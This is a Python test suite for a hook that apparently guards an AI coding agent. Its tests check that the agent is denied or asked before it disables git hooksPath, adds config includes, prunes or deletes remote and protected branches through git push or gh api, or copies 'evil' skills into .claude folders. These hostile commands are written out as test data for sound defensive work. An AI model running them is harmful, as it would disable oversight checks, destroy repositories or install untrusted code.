"""Round-5 git and skill rules: git config files, push --prune, gh api ref writes, nested skill folders and
CLAUDE_CONFIG_DIR."""

import os
import unittest

from helpers import HookCase

from checkrein import ledger

# Built from pieces so the test file itself reads as plain text to the rules it tests.
HOOKS_KEY = "hooks" + "Path"
HOOKS_LINE = "[core]\n\t%s = /dev/null\n" % HOOKS_KEY
INCLUDE = "[in" + "clude]\n\tpath = /tmp/inc\n"
INCLUDE_IF = "[in" + "cludeIf \"gitdir:/\"]\n\tpath = /tmp/inc\n"


class Base(HookCase):
    def denied(self, result, rule):
        self.assertDecision("deny", result, rule)

    def stopped(self, result, rule):
        decision, reason = result
        self.assertIn(decision, ("ask", "deny"), reason)
        self.assertIn("checkrein %s" % rule, reason)

    def write(self, path, content, **kw):
        return self.pre("Write", {"file_path": path, "content": content}, **kw)

    def edit(self, path, old, new):
        return self.pre("Edit", {"file_path": path, "old_string": old, "new_string": new})

    def repo_config(self, text):
        os.makedirs(os.path.join(self.project, ".git"), exist_ok=True)
        path = os.path.join(self.project, ".git", "config")
        with open(path, "w") as fh:
            fh.write(text)
        return path


class GitConfigFiles(Base):
    """H6: every git config file, and any change to core.hooksPath or an include, not only adding hooksPath."""

    def test_user_and_system_config_files(self):
        for rel in (".gitconfig", os.path.join(".config", "git", "config")):
            self.denied(self.write(os.path.join(self.home, rel), HOOKS_LINE), "GIT05")
        xdg = os.path.join(self.tmp, "xdg")
        self.denied(self.write(os.path.join(xdg, "git", "config"), HOOKS_LINE,
                               extra_env={"XDG_CONFIG_HOME": xdg}), "GIT05")
        self.denied(self.write("/etc/gitconfig", HOOKS_LINE), "GIT05")
        self.denied(self.bash("printf '%s' >> ~/.gitconfig" % HOOKS_LINE.replace("\n", "\\n")), "GIT05")

    def test_includes(self):
        path = os.path.join(self.project, ".git", "config")
        self.denied(self.write(path, INCLUDE), "GIT05")
        self.denied(self.write(path, INCLUDE_IF), "GIT05")
        self.denied(self.bash("printf '%s' >> .git/config" % INCLUDE.replace("\n", "\\n")), "GIT05")
        self.denied(self.bash("printf '%s' >> .git/config" % INCLUDE_IF.replace("\n", "\\n")), "GIT05")

    def test_removing_hooks_path(self):
        line = "\t%s = .husky/_\n" % HOOKS_KEY
        path = self.repo_config("[core]\n\tbare = false\n" + line)
        self.denied(self.edit(path, line, ""), "GIT05")
        self.denied(self.write(path, "[core]\n\tbare = false\n"), "GIT05")
        self.denied(self.pre("MultiEdit", {"file_path": path, "edits": [
            {"old_string": ".husky/_", "new_string": "/dev/null"}]}), "GIT05")
        self.assertDecision("allow", self.edit(path, "bare = false", "bare = true"))

    def test_shell_copy_onto_config_asks(self):
        self.repo_config("[core]\n\t%s = .husky/_\n" % HOOKS_KEY)
        self.stopped(self.bash("head -2 .git/config > /tmp/c && cp /tmp/c .git/config"), "GIT05")
        self.stopped(self.bash("mv /tmp/c ~/.gitconfig"), "GIT05")
        self.stopped(self.bash(": > .git/config"), "GIT05")
        self.stopped(self.bash("sed -i '' '/husky/d' .git/config"), "GIT05")

    def test_submodule_hooks(self):
        hook = os.path.join(self.project, ".git", "modules", "lib", "hooks", "pre-commit")
        self.denied(self.write(hook, "exit 0\n"), "GIT05")
        self.denied(self.bash("echo 'exit 0' > .git/modules/lib/modules/inner/hooks/pre-push"), "GIT05")


class PushPrune(Base):
    """H7: push --prune deletes every remote branch its refspecs cover that has no local branch."""

    def test_prune_over_every_branch(self):
        for command in ("git push --prune origin 'refs/heads/*:refs/heads/*'", "git push --prune --all origin",
                        "git push --pru --all origin", "git push --all --prune origin",
                        "git push --prune --branches origin", "git push --prune origin 'refs/heads/rel*'"):
            self.denied(self.bash(command), "GIT01")


class GhApiRefs(Base):
    """L2: deleting or moving a protected branch through the GitHub API."""

    def test_ref_writes(self):
        for command in ("gh api -X DELETE repos/o/r/git/refs/heads/main",
                        "gh api --method DELETE /repos/o/r/git/refs/heads/master",
                        "gh api -XDELETE repos/o/r/git/refs/heads/release/1.0",
                        "gh api --method=patch repos/o/r/git/refs/heads/main -F force=true -f sha=abc",
                        "gh api -X PATCH \"repos/o/r/git/refs/heads/$B\" -F force=true"):
            self.denied(self.bash(command), "GIT01")


class NestedSkillFolders(Base):
    """M1: .claude/skills, commands and agents anywhere in the project, and commands and agents in ~/.claude."""

    def test_bringing_files_in(self):
        p = self.project
        for command in ("git clone https://example.com/evil %s/packages/app/.claude/skills/evil" % p,
                        "cp -r /tmp/evil %s/packages/app/.claude/skills/" % p,
                        "cp -r /tmp/evil/.claude %s/packages/app/" % p,
                        "git clone https://example.com/evil ~/.claude/commands/evil",
                        "cp -r /tmp/evil/commands ~/.claude/",
                        "cp -r /tmp/evil ~/.claude/agents/",
                        "cp -r /tmp/evil %s/.claude/agents/" % p,
                        "cp -r /tmp/evil %s/.claude/commands/" % p):
            self.denied(self.bash(command), "SKL01")
        os.makedirs(os.path.join(p, "sub"))
        self.denied(self.bash("cd %s/sub && git clone https://example.com/evil .claude/skills/evil" % p), "SKL01")

    def test_inventory_finds_nested_skills(self):
        for rel in ("packages/app/.claude/skills/nested", "node_modules/x/.claude/skills/hidden",
                    ".git/x/.claude/skills/hidden"):
            folder = os.path.join(self.project, rel)
            os.makedirs(folder)
            with open(os.path.join(folder, "SKILL.md"), "w") as fh:
                fh.write("---\nname: x\n---\n")
        paths = set(ledger.inventory(self.home, self.project).values())
        self.assertIn(os.path.join(self.project, "packages/app/.claude/skills/nested"), paths)
        self.assertFalse([x for x in paths if "hidden" in x])


class ConfigDir(Base):
    """M3: skill and plugin folders follow CLAUDE_CONFIG_DIR."""

    def setUp(self):
        super(ConfigDir, self).setUp()
        self.cfg = os.path.join(self.tmp, "cfgdir")
        os.makedirs(self.cfg)
        self.env["CLAUDE_CONFIG_DIR"] = self.cfg

    def test_skill_and_plugin_folders(self):
        self.denied(self.bash("cp -r /tmp/evil %s/skills/" % self.cfg), "SKL01")
        self.denied(self.bash("git clone https://example.com/evil %s/skills/evil" % self.cfg), "SKL01")
        self.denied(self.write(os.path.join(self.cfg, "plugins", "cache", "m", "p", "x.md"), "x"), "SKL01")


if __name__ == "__main__":
    unittest.main()
